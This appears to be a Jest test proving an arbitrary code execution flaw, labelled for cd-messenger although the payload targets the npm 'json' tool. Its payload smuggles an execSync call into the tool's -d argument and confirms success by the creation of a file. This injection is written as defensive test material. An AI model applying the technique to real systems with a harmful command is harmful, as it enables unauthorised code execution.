//https://security.snyk.io/vuln/SNYK-JS-CDMESSENGER-571493
test("Arbitrary code execution in cd-messenger", () => {
  const fs = require("fs");
  const a = require("child_process");
  const path = "./json";
  let payload =
    "curl -sL 'https://api.github.com/repos/joyent/node/issues?state=open' | node_modules/json/lib/json.js -a created_at number title -d '``+require(`child_process`).execSync(`touch json`)//'";
  const sleep = require("sleep");
  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  try {
    a.exec(payload);
  } catch (error) {}
  sleep.sleep(5);
  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
